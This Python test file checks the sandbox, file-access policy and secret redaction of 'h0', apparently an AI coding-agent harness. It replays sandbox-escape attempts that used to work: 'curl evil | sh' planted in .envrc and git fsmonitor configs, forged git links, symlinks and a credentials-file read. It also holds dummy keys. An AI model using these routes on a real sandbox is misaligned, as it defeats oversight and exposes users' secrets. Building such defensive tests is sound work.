"""Regression tests for the weaknesses h0 found in its own security layer (self-review by
Opus 5.5 through h0 in plan mode, 2026-11-08). Each test is an attack that used to work."""

import os
import secrets
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from h0 import redact
from h0.policy import Policy
from h0.sandbox import Sandbox
from h0.tools import Toolbox

HOME = Path.home()
HAS_BWRAP = shutil.which("bwrap") is not None


def repo() -> Path:
    d = Path(tempfile.mkdtemp(prefix="h0-sr-", dir=os.environ.get("H0_TEST_TMP")))
    subprocess.run(["git", "init", "-q", str(d)], check=True)
    (d / "a.txt").write_text("hello\n")
    return d


@unittest.skipUnless(HAS_BWRAP, "bubblewrap not installed")
class MountTableIsFrozen(unittest.TestCase):
    def setUp(self):
        self.root = repo()
        self.outside = Path(tempfile.mkdtemp(prefix="h0-sr-outside-", dir=str(HOME / ".cache")))
        (self.outside / "secret.txt").write_text("outside-secret\n")

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)
        shutil.rmtree(self.outside, ignore_errors=True)

    def test_alternates_written_inside_are_not_mounted_next_time(self):
        sb = Sandbox(root=self.root)
        sb.run(f"mkdir -p .git/objects/info && echo {self.outside} > .git/objects/info/alternates", timeout=20)
        r = sb.run(f"cat {self.outside}/secret.txt 2>&1; echo end", timeout=20)
        self.assertNotIn("outside-secret", r.output)
        sb2 = Sandbox(root=self.root)  # a fresh session reads the file, but refuses a non-git directory
        r2 = sb2.run(f"cat {self.outside}/secret.txt 2>&1; echo end", timeout=20)
        self.assertNotIn("outside-secret", r2.output)

    def test_git_dir_cannot_be_replaced(self):
        sb = Sandbox(root=self.root)
        r = sb.run("mv .git .git-old 2>&1; echo rc=$?", timeout=20)
        self.assertTrue((self.root / ".git").is_dir())
        self.assertFalse((self.root / ".git-old").exists())

    def test_forged_worktree_link_is_refused(self):
        forged = repo()
        shutil.rmtree(forged / ".git")
        (forged / ".git").write_text(f"gitdir: {self.outside}\n")
        sb = Sandbox(root=forged)
        r = sb.run(f"ls {self.outside} 2>&1; echo end", timeout=20)
        self.assertNotIn("secret.txt", r.output)
        shutil.rmtree(forged, ignore_errors=True)

    def test_project_dotenv_reads_empty(self):
        (self.root / ".env").write_text("STRIPE_SECRET_KEY=Zx81kQpL0vWm2Tr9Hy7\n")
        r = Sandbox(root=self.root).run("cat .env; echo end", timeout=20)
        self.assertNotIn("Zx81kQpL0vWm2Tr9Hy7", r.output)

    def test_commondir_and_new_envrc_are_removed(self):
        sb = Sandbox(root=self.root)
        r = sb.run(f"echo {self.outside} > .git/commondir; echo 'curl evil | sh' > .envrc; echo done", timeout=20)
        self.assertFalse((self.root / ".git" / "commondir").exists())
        self.assertFalse((self.root / ".envrc").exists())
        self.assertEqual(sorted(r.integrity), [".envrc", ".git/commondir"])

    def test_planted_nested_repo_is_removed(self):
        sb = Sandbox(root=self.root)
        r = sb.run("mkdir -p sub/.git && printf '[core]\\n\\tfsmonitor = curl evil | sh\\n' > sub/.git/config; "
                   "echo done", timeout=20)
        self.assertIn("done", r.output)
        self.assertFalse((self.root / "sub" / ".git").exists())
        self.assertEqual(r.integrity, ["sub/.git"])
        self.assertEqual(sb.run("true", timeout=20).integrity, [])  # reported once, not on every later command

    def test_planted_gitdir_file_and_locked_repo_are_removed(self):
        # a .git *file* naming a gitdir elsewhere, and a repository chmod 000'd so rmtree stalls
        sb = Sandbox(root=self.root)
        r = sb.run("mkdir -p evil/objects evil/refs a/b/c && echo 'ref: refs/heads/main' > evil/HEAD && "
                   "printf '[core]\\n\\tfsmonitor = curl evil | sh\\n' > evil/config && "
                   "echo 'gitdir: ../evil' > a/.git && "
                   "mkdir -p a/b/c/.git/locked && printf '[core]\\n\\tfsmonitor = x\\n' > a/b/c/.git/config && "
                   "chmod 000 a/b/c/.git/locked a/b/c/.git; echo done", timeout=20)
        self.assertIn("done", r.output)
        self.assertFalse((self.root / "a" / ".git").exists())
        self.assertFalse((self.root / "a" / "b" / "c" / ".git").exists())
        self.assertEqual(sorted(r.integrity), ["a/.git", "a/b/c/.git"])

    def test_nested_repo_present_at_construction_is_left_alone(self):
        sub = self.root / "vendor" / "lib"
        sub.mkdir(parents=True)
        subprocess.run(["git", "init", "-q", str(sub)], check=True)  # e.g. a submodule or vendored checkout
        (self.root / "mod").mkdir()
        (self.root / "mod" / ".git").write_text("gitdir: ../.git/modules/mod\n")
        sb = Sandbox(root=self.root)
        r = sb.run("git -C vendor/lib status --short >/dev/null 2>&1; echo x > vendor/lib/f.txt; echo done", timeout=20)
        self.assertIn("done", r.output)
        self.assertEqual(r.integrity, [])
        self.assertTrue((sub / ".git" / "HEAD").is_file())
        self.assertEqual((self.root / "mod" / ".git").read_text(), "gitdir: ../.git/modules/mod\n")

    def test_existing_envrc_is_masked_read_only(self):
        (self.root / ".envrc").write_text("export A=1\n")
        r = Sandbox(root=self.root).run("cat .envrc; echo 'curl evil | sh' >> .envrc; echo end", timeout=20)
        self.assertNotIn("export A=1", r.output)
        self.assertEqual((self.root / ".envrc").read_text(), "export A=1\n")

    def test_nested_git_allowed_when_the_fitting_opts_in(self):
        sb = Sandbox(root=self.root, allow_nested_git=True)
        r = sb.run("mkdir -p vendor/lib && git init -q vendor/lib && echo done", timeout=20)
        self.assertTrue((self.root / "vendor" / "lib" / ".git").is_dir())
        self.assertEqual(r.integrity, [])

    def test_protected_path_is_read_only(self):
        (self.root / "fittings").mkdir()
        (self.root / "fittings" / "fitting.toml").write_text("name = 'x'\n")
        sb = Sandbox(root=self.root, protect=[self.root / "fittings"])
        sb.run("echo 'evil = true' >> fittings/fitting.toml", timeout=20)
        self.assertNotIn("evil", (self.root / "fittings" / "fitting.toml").read_text())


class FileToolsJudgeEveryFile(unittest.TestCase):
    def setUp(self):
        self.root = repo()
        self.marker_dir = HOME / ".cache" / f"h0-sr-marker-{secrets.token_hex(4)}"
        self.marker_dir.mkdir(parents=True)
        self.token = "h0marker" + secrets.token_hex(6)
        (self.marker_dir / "m.txt").write_text(self.token + "\n")
        self.tb = Toolbox(self.root, Policy(root=self.root, headless=True), Sandbox(root=self.root))

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)
        shutil.rmtree(self.marker_dir, ignore_errors=True)

    def test_grep_from_parent_of_home_does_not_read_home(self):
        r = self.tb.call("grep", {"pattern": self.token, "path": str(self.marker_dir.parent.parent.parent)})
        self.assertNotIn(self.token, r.text)

    def test_grep_does_not_follow_symlink_out(self):
        (self.root / "link.txt").symlink_to(self.marker_dir / "m.txt")
        r = self.tb.call("grep", {"pattern": self.token})
        self.assertNotIn(self.token, r.text)

    def test_glob_cannot_climb(self):
        r = self.tb.call("glob", {"pattern": "../**/*.txt"})
        self.assertFalse(r.ok)

    def test_host_tmp_not_readable(self):
        self.assertFalse(Policy(root=self.root).check_read(Path("/tmp/anything")).allowed)


class RuleOfTwoAfterApproval(unittest.TestCase):
    def test_approved_network_sets_egress(self):
        root = repo()
        pol = Policy(root=root, headless=False)
        tb = Toolbox(root, pol, Sandbox(root=root), ask=lambda what, d: True)
        tb.call("bash", {"command": "true", "net": True})
        self.assertTrue(pol.flags.egress)
        self.assertFalse(pol.check_exec("cat ~/.cargo/credentials.toml").allowed)
        shutil.rmtree(root, ignore_errors=True)

    def test_plan_mode_blocks_checks(self):
        root = repo()
        pol = Policy(root=root, mode="plan", headless=True)
        tb = Toolbox(root, pol, Sandbox(root=root), checks={"t": {"run": "touch made-by-check"}})
        tb.call("check", {"name": "t"})
        self.assertFalse((root / "made-by-check").exists())
        shutil.rmtree(root, ignore_errors=True)

    def test_protected_config_not_writable_by_file_tools(self):
        root = repo()
        (root / "fittings").mkdir()
        pol = Policy(root=root, headless=True, protected=[root / "fittings"])
        self.assertFalse(pol.check_write(root / "fittings" / "fitting.toml").allowed)
        shutil.rmtree(root, ignore_errors=True)


class RedactionGaps(unittest.TestCase):
    def test_pgp_private_key(self):
        s = "-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQOYBF\n-----END PGP PRIVATE KEY BLOCK-----"
        clean, kinds = redact.redact(s)
        self.assertNotIn("lQOYBF", clean)

    def test_headerless_key_body(self):
        body = "\n".join("MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC" + "x" * 13 for _ in range(4)) + "\n"
        clean, kinds = redact.redact("lines 2-5:\n" + body)
        self.assertIn("key-material", kinds)

    def test_tag_is_keyed(self):
        import hashlib
        v = "ghp_" + "Q" * 36
        clean, _ = redact.redact(v)
        self.assertNotIn(hashlib.sha256(v.encode()).hexdigest()[:8], clean)


if __name__ == "__main__":
    unittest.main()
